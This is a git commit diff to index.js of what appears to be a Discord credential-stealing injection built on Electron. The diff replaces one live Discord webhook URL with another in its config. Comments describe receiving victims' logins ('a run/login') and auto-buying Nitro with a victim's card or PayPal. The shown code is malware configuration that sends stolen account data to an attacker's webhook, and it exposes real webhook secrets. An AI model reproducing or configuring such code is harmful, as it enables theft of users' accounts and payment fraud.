8f5b462b7fee2ff4d6f802a6fe1009396d59e1b7
mehwenarweoasdaawd <138705744+mehwenarweoasdaawd@users.noreply.github.com>
2023-08-16 13:05:01 -0500

    Update index.js

--- index.js
+++ index.js
@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1134689061332856922/Kr4ANRDrkJEIgOQoQJKfLPIH-b6Ch5NQJgf6MXfBOY75QIKUK5jAvp4INTfTPF6upESI', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook: 'https://discord.com/api/webhooks/1141430660876226700/UL4SWSIKzjjLRn6BmKQ82G7xCNoW9OM5Lh9urv9izTQPDh1FOQgrvSKkInJ7udeAc5QJ', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
